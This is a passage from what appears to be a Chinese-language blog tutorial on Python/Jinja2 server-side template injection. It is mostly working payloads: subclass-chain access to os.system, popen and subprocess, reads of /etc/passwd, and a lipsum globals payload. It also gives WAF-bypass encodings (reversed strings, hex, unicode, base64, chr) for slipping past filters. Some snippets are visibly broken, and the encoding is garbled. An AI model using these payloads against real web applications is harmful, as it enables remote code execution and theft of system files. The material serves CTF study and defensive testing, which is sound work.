class="hljs-string">&#x27;utf_8_decode&#x27;</span>, <span class="hljs-string">&#x27;raw_unicode_escape_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_7_decode&#x27;</span>, <span class="hljs-string">&#x27;unicode_escape_decode&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;lookup&#x27;</span>, <span class="hljs-string">&#x27;strict_errors&#x27;</span>, <span class="hljs-string">&#x27;utf_32_ex_decode&#x27;</span>, <span class="hljs-string">&#x27;escape_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_be_decode&#x27;</span>, <span class="hljs-string">&#x27;StreamRecoder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;utf_16_le_decode&#x27;</span>, <span class="hljs-string">&#x27;iterdecode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_encode&#x27;</span>, <span class="hljs-string">&#x27;charmap_decode&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF16&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF8&#x27;</span>, <span class="hljs-string">&#x27;utf_32_le_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM64_LE&#x27;</span>, <span class="hljs-string">&#x27;ascii_encode&#x27;</span>, <span class="hljs-string">&#x27;register&#x27;</span>, <span class="hljs-string">&#x27;utf_8_encode&#x27;</span>, <span class="hljs-string">&#x27;utf_16_be_encode&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-number">77</span>)<br>[<span class="hljs-string">&#x27;latin_1_encode&#x27;</span>, <span class="hljs-string">&#x27;getreader&#x27;</span>, <span class="hljs-string">&#x27;readbuffer_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM&#x27;</span>, <span class="hljs-string">&#x27;StreamWriter&#x27;</span>, <span class="hljs-string">&#x27;BOM64_BE&#x27;</span>, <span class="hljs-string">&#x27;ascii_decode&#x27;</span>, <span class="hljs-string">&#x27;IncrementalDecoder&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF32&#x27;</span>, <span class="hljs-string">&#x27;BufferedIncrementalDecoder&#x27;</span>, <span class="hljs-string">&#x27;ignore_errors&#x27;</span>, <span class="hljs-string">&#x27;replace_errors&#x27;</span>, <span class="hljs-string">&#x27;BOM_BE&#x27;</span>, <span class="hljs-string">&#x27;utf_16_be_decode&#x27;</span>, <span class="hljs-string">&#x27;charmap_build&#x27;</span>, <span class="hljs-string">&#x27;escape_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF16_BE&#x27;</span>, <span class="hljs-string">&#x27;xmlcharrefreplace_errors&#x27;</span>, <span class="hljs-string">&#x27;unicode_escape_encode&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;utf_16_decode&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;lookup_error&#x27;</span>, <span class="hljs-string">&#x27;getincrementalencoder&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;EncodedFile&#x27;</span>, <span class="hljs-string">&#x27;backslashreplace_errors&#x27;</span>, <span class="hljs-string">&#x27;getincrementaldecoder&#x27;</span>, <span class="hljs-string">&#x27;register_error&#x27;</span>, <span class="hljs-string">&#x27;BOM32_BE&#x27;</span>, <span class="hljs-string">&#x27;getencoder&#x27;</span>, <span class="hljs-string">&#x27;make_identity_dict&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF32_LE&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;iterencode&#x27;</span>, <span class="hljs-string">&#x27;decode&#x27;</span>, <span class="hljs-string">&#x27;IncrementalEncoder&#x27;</span>, <span class="hljs-string">&#x27;latin_1_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_le_decode&#x27;</span>, <span class="hljs-string">&#x27;getwriter&#x27;</span>, <span class="hljs-string">&#x27;charmap_encode&#x27;</span>, <span class="hljs-string">&#x27;encode&#x27;</span>, <span class="hljs-string">&#x27;unicode_internal_encode&#x27;</span>, <span class="hljs-string">&#x27;StreamReader&#x27;</span>, <span class="hljs-string">&#x27;make_encoding_map&#x27;</span>, <span class="hljs-string">&#x27;utf_16_ex_decode&#x27;</span>, <span class="hljs-string">&#x27;getdecoder&#x27;</span>, <span class="hljs-string">&#x27;charbuffer_encode&#x27;</span>, <span class="hljs-string">&#x27;utf_7_encode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_decode&#x27;</span>, <span class="hljs-string">&#x27;BOM32_LE&#x27;</span>, <span class="hljs-string">&#x27;StreamReaderWriter&#x27;</span>, <span class="hljs-string">&#x27;utf_16_encode&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;raw_unicode_escape_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF32_BE&#x27;</span>, <span class="hljs-string">&#x27;utf_16_le_encode&#x27;</span>, <span class="hljs-string">&#x27;unicode_internal_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_be_encode&#x27;</span>, <span class="hljs-string">&#x27;CodecInfo&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF16_LE&#x27;</span>, <span class="hljs-string">&#x27;BufferedIncrementalEncoder&#x27;</span>, <span class="hljs-string">&#x27;BOM_LE&#x27;</span>, <span class="hljs-string">&#x27;Codec&#x27;</span>, <span class="hljs-string">&#x27;_false&#x27;</span>, <span class="hljs-string">&#x27;utf_8_decode&#x27;</span>, <span class="hljs-string">&#x27;raw_unicode_escape_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_7_decode&#x27;</span>, <span class="hljs-string">&#x27;unicode_escape_decode&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;lookup&#x27;</span>, <span class="hljs-string">&#x27;strict_errors&#x27;</span>, <span class="hljs-string">&#x27;utf_32_ex_decode&#x27;</span>, <span class="hljs-string">&#x27;escape_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_be_decode&#x27;</span>, <span class="hljs-string">&#x27;StreamRecoder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;utf_16_le_decode&#x27;</span>, <span class="hljs-string">&#x27;iterdecode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_encode&#x27;</span>, <span class="hljs-string">&#x27;charmap_decode&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF16&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF8&#x27;</span>, <span class="hljs-string">&#x27;utf_32_le_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM64_LE&#x27;</span>, <span class="hljs-string">&#x27;ascii_encode&#x27;</span>, <span class="hljs-string">&#x27;register&#x27;</span>, <span class="hljs-string">&#x27;utf_8_encode&#x27;</span>, <span class="hljs-string">&#x27;utf_16_be_encode&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-number">78</span>)<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ¯ä¸ªéƒ½æ˜¯å­—å…¸å½¢å¼ï¼šæˆ‘ä»¬é€šè¿‡<code>__builtins__[&#39;__import__&#39;] </code>æ¥è®¿é—®<code>__import__</code>æ¨¡å—</p><p>ç„¶åå¯¼å…¥ os æ¨¡å—:<code>__builtins__[&#39;__import__&#39;](&#39;os&#39;)</code></p><p>è¿™æ—¶å€™æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œpayloadå°±å‡ºæ¥äº†ï¼š</p><p><code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">64</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="é€šè¿‡å‡½æ•°-eval-å’Œ-execå¯¼å…¥æ¨¡å—"><a href="#é€šè¿‡å‡½æ•°-eval-å’Œ-execå¯¼å…¥æ¨¡å—" class="headerlink" title="é€šè¿‡å‡½æ•° eval å’Œ execå¯¼å…¥æ¨¡å—:"></a>é€šè¿‡å‡½æ•° eval å’Œ execå¯¼å…¥æ¨¡å—:</h3><p>è¿˜æœ‰å¦ä¸€ç§å¯¼å…¥importæ¨¡å—çš„æ–¹æ³•ï¼š</p><p>é€šè¿‡å‡½æ•°å¯¼å…¥æ¨¡å— eval å’Œ exec:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>) <br><br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">64</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="åŸºç¡€payload"><a href="#åŸºç¡€payload" class="headerlink" title="åŸºç¡€payload"></a>åŸºç¡€payload</h2><h3 id="è·å–åŸºæœ¬ç±»"><a href="#è·å–åŸºæœ¬ç±»" class="headerlink" title="è·å–åŸºæœ¬ç±»"></a>è·å–åŸºæœ¬ç±»</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[8]<br></code></pre></td></tr></table></figure><h3 id="1-åˆ©ç”¨os-æ¨¡å—çš„-popen-å‡½æ•°å’Œ-system-å‡½æ•°"><a href="#1-åˆ©ç”¨os-æ¨¡å—çš„-popen-å‡½æ•°å’Œ-system-å‡½æ•°" class="headerlink" title="1.åˆ©ç”¨os æ¨¡å—çš„ popen å‡½æ•°å’Œ system å‡½æ•°"></a>1.åˆ©ç”¨os æ¨¡å—çš„ popen å‡½æ•°å’Œ system å‡½æ•°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">154</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat  /etc/passwd&#x27;</span>).read()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">154</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;cat  /etc/passwd&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="2-åˆ©ç”¨subprocess"><a href="#2-åˆ©ç”¨subprocess" class="headerlink" title="2.åˆ©ç”¨subprocess"></a>2.åˆ©ç”¨subprocess</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i, cls <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">object</span>.__subclasses__()):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;cls.__name__&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">253</span>]([<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>]).stdout.read()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[][<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="hljs-number">351</span>]([<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>],stdout=-<span class="hljs-number">1</span>).communicate()[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><h3 id="3-åˆ©ç”¨lipsumå†…ç½®å‡½æ•°"><a href="#3-åˆ©ç”¨lipsumå†…ç½®å‡½æ•°" class="headerlink" title="3.åˆ©ç”¨lipsumå†…ç½®å‡½æ•°"></a>3.åˆ©ç”¨lipsumå†…ç½®å‡½æ•°</h3><p>åœ¨ Jinja2 æ¨¡æ¿ä¸­ï¼Œ<code>lipsum</code> é€šå¸¸æ˜¯å†…ç½®çš„å‡½æ•°ï¼ˆä¾‹å¦‚åœ¨ Flask ä¸­ä½ ä½¿ç”¨ <code>render_template()</code> å¹¶å¯ç”¨ <code>jinja2.ext.i18n</code> æˆ– <code>jinja2.ext.do</code> æ‰©å±•æ—¶ï¼‰ï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ° <code>lipsum</code> å¯ç”¨äºç”Ÿæˆè™šæ‹Ÿæ–‡æœ¬ï¼ˆlorem ipsumï¼‰ã€‚</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">lipsum.__globals__</span>[&quot;os&quot;].popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="å¸¸è§ç»•wafçš„å§¿åŠ¿"><a href="#å¸¸è§ç»•wafçš„å§¿åŠ¿" class="headerlink" title="å¸¸è§ç»•wafçš„å§¿åŠ¿"></a>å¸¸è§ç»•wafçš„å§¿åŠ¿</h2><p><a href="https://www.cnblogs.com/h0cksr/p/16189711.html?utm_source=chatgpt.com">SSTIæ¨¡æ¿æ³¨å…¥Plus | Bypass - h0cksr - åšå®¢å›­</a></p><h3 id="ç»•è¿‡ç‰¹æ®Šå­—ç¬¦ä¸²è¿‡æ»¤ï¼š"><a href="#ç»•è¿‡ç‰¹æ®Šå­—ç¬¦ä¸²è¿‡æ»¤ï¼š" class="headerlink" title="ç»•è¿‡ç‰¹æ®Šå­—ç¬¦ä¸²è¿‡æ»¤ï¼š"></a>ç»•è¿‡ç‰¹æ®Šå­—ç¬¦ä¸²è¿‡æ»¤ï¼š</h3><h4 id="é€†åºï¼š"><a href="#é€†åºï¼š" class="headerlink" title="é€†åºï¼š"></a>é€†åºï¼š</h4><p>å¦‚ç»•è¿‡ os è¿‡æ»¤ï¼Œå¯ä»¥â½¤å­—ç¬¦ä¸²çš„å˜åŒ–æ¥å¼•â¼Š os</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åˆ©â½¤ eval æˆ–è€… exec ï¼Œç»“åˆå­—ç¬¦ä¸²å€’åº </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>]) <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h4 id="æ‹¼æ¥"><a href="#æ‹¼æ¥" class="headerlink" title="æ‹¼æ¥"></a>æ‹¼æ¥</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">&#x27;o&#x27;</span> a = <span class="hljs-string">&#x27;s&#x27;</span> <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="ç¼–ç å¤„ç†"><a href="#ç¼–ç å¤„ç†" class="headerlink" title="ç¼–ç å¤„ç†"></a>ç¼–ç å¤„ç†</h4><p> base64 ã€ hex ã€ rot3 ã€ unicode ã€ oct ã€å­—ç¬¦ä¸²æ‹¼æ¥ç­‰</p><table><thead><tr><th>ç¤ºä¾‹</th><th>æŠ€æœ¯åˆ†ç±»</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>[&#39;__builtins__&#39;]</code></td><td>ç›´æ¥å­—ç¬¦ä¸²</td><td>æ­£å¸¸æ–¹å¼è®¿é—®</td></tr><tr><td><code>[&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;]</code></td><td>åå…­è¿›åˆ¶è½¬ä¹‰</td><td>æ¯ä¸ªå­—ç¬¦ç”¨ <code>\xNN</code> è¡¨ç¤º</td></tr><tr><td><code>[u&#39;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#39;]</code></td><td>Unicode è½¬ä¹‰</td><td>æ¯ä¸ªå­—ç¬¦ç”¨ <code>\uXXXX</code> è¡¨ç¤º</td></tr><tr><td><code>[&#39;X19idWlsdGluc19f&#39;.decode(&#39;base64&#39;)]</code></td><td>base64 è§£ç </td><td><code>&#39;__builtins__&#39;</code> çš„ base64 ç¼–ç æ˜¯ <code>X19idWlsdGluc19f</code></td></tr><tr><td><code>[&#39;__buil&#39;+&#39;tins__&#39;]</code></td><td>å­—ç¬¦ä¸²æ‹¼æ¥</td><td>åˆ†æ®µæ‹¼æ¥</td></tr><tr><td><code>[&#39;__buil&#39;&#39;tins__&#39;]</code></td><td>Python è‡ªåŠ¨è¿æ¥å­—é¢å€¼</td><td>ä¸¤ä¸ªå­—ç¬¦ä¸²ç´§æŒ¨ç€ Python ä¼šè‡ªåŠ¨è¿æ¥</td></tr><tr><td><code>[&#39;__buil&#39;.__add__(&#39;tins__&#39;)]</code></td><td>ä½¿ç”¨å­—ç¬¦ä¸²å¯¹è±¡æ–¹æ³•</td><td>ç­‰ä»·äº <code>&#39;__buil&#39; + &#39;tins__&#39;</code></td></tr><tr><td><code>[&quot;_builtins_&quot;.join(&quot;__&quot;)]</code></td><td>åˆ©ç”¨ <code>join</code> æ‹¼æ¥</td><td>ç»“æœä¸º <code>_builtins___builtins_</code>ï¼ˆè¿™ä¸ªå¯èƒ½æ˜¯ç¤ºä¾‹å†™é”™ï¼‰</td></tr><tr><td><code>[&#39;%c%c%c%c%c%c%c%c%c%c%c%c&#39; % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]</code></td><td>æ ¼å¼åŒ–è¾“å‡ºå­—ç¬¦</td><td><code>%c</code> å°†æ•°å­—æ ¼å¼åŒ–æˆ ASCII å­—ç¬¦ï¼Œå¾—åˆ° <code>&#39;__builtins__&#39;</code></td></tr></tbody></table><p>16è¿›åˆ¶ç¼–ç è½¬æ¢:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_hex</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-comment"># å°†å­—ç¬¦ä¸²ç¼–ç æˆå­—èŠ‚ï¼ˆbytesï¼‰</span><br>    byte_array = string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    <span class="hljs-comment"># å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º16è¿›åˆ¶è¡¨ç¤ºï¼Œå¹¶è¿”å›ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</span><br>    hex_string = byte_array.<span class="hljs-built_in">hex</span>()<br>    <br>    <span class="hljs-keyword">return</span> hex_string<br><br><span class="hljs-comment"># æµ‹è¯•å­—ç¬¦ä¸²</span><br>input_string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦è½¬æ¢çš„å­—ç¬¦ä¸²: &quot;</span>)<br>hex_output = string_to_hex(input_string)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è½¬æ¢åçš„16è¿›åˆ¶å­—ç¬¦ä¸²æ˜¯: <span class="hljs-subst">&#123;hex_output&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="popenä»£æ›¿system"><a href="#popenä»£æ›¿system" class="headerlink" title="popenä»£æ›¿system"></a>popenä»£æ›¿system</h3><p>å¦‚æœåˆ é™¤äº† system è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¯»æ‰¾å…¶ä»–è¿›â¾å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œå¦‚ popenï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()  <br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).read() <span class="hljs-comment"># py2 </span><br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).read() <span class="hljs-comment"># py3</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨getattrè·å–å¯¹è±¡çš„å±æ€§"><a href="#ä½¿ç”¨getattrè·å–å¯¹è±¡çš„å±æ€§" class="headerlink" title="ä½¿ç”¨getattrè·å–å¯¹è±¡çš„å±æ€§"></a>ä½¿ç”¨getattrè·å–å¯¹è±¡çš„å±æ€§</h3><p><code>getattr()</code> æ˜¯ Python çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºæ ¹æ®å­—ç¬¦ä¸²åŠ¨æ€è·å–å¯¹è±¡çš„å±æ€§</p><p>å¯ä»¥é€šè¿‡<code> getattr</code>æ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>(os <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="å­—ç¬¦çš„ç»•è¿‡"><a href="#å­—ç¬¦çš„ç»•è¿‡" class="headerlink" title="å­—ç¬¦çš„ç»•è¿‡"></a>å­—ç¬¦çš„ç»•è¿‡</h3><h4 id="é­”æ³•å‡½æ•°ç»•è¿‡"><a href="#é­”æ³•å‡½æ•°ç»•è¿‡" class="headerlink" title="é­”æ³•å‡½æ•°ç»•è¿‡[]"></a>é­”æ³•å‡½æ•°ç»•è¿‡[]</h4><p>è·å–é”®å€¼çš„æœ¬è´¨æ˜¯è°ƒç”¨é­”æ³•å‡½æ•°<code>__getitem__()</code></p><p>æ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>__getitem__()</code>æ›¿ä»£ä¸­æ‹¬å·å–é”®å€¼å½“ä¸­æ‹¬å·è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>__getitem__()</code>ä»£æ›¿<code>ï¼»ï¼½</code>,å®ç°ç»•è¿‡ã€‚</p><p>æ­¤å¤–å¯¹äºå­—å…¸å¯¹è±¡çš„è¯è¿˜å¯ä½¿ç”¨pop()å‡½æ•°å¾—åˆ°é”®å€¼,è¿˜æœ‰å…¶ä»–ä¸€äº›æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;&#125;<br>&#123;&#123;url_for.__globals__.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)&#125;&#125;<br>&#123;&#123;url_for.__globals__.pop(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)&#125;&#125;<br>&#123;&#123;url_for.__globals__.get(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)&#125;&#125;<br>&#123;&#123;url_for.__globals__.setdefault(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h4><h5 id="chrå‡½æ•°"><a href="#chrå‡½æ•°" class="headerlink" title="chrå‡½æ•°"></a>chrå‡½æ•°</h5><p>python2:</p><p>ç¬¬ä¸€è¡Œï¼šè·å–å†…ç½®å‡½æ•° <code>chr</code></p><p>ç¬¬äºŒè¡Œï¼šæ„é€ è·¯å¾„å¹¶ä½¿ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">chr</span> %&#125;<br>&#123;&#123;().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)%2bchr(<span class="hljs-number">101</span>)%2bchr(<span class="hljs-number">116</span>)%2bchr(<span class="hljs-number">99</span>)%2bchr(<span class="hljs-number">47</span>)%2bchr(<span class="hljs-number">112</span>)%2bchr(<span class="hljs-number">97</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">119</span>)%2bchr(<span class="hljs-number">100</span>)).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h5 id="requestå¯¹è±¡"><a href="#requestå¯¹è±¡" class="headerlink" title="requestå¯¹è±¡"></a>requestå¯¹è±¡</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(request.args.path).read() 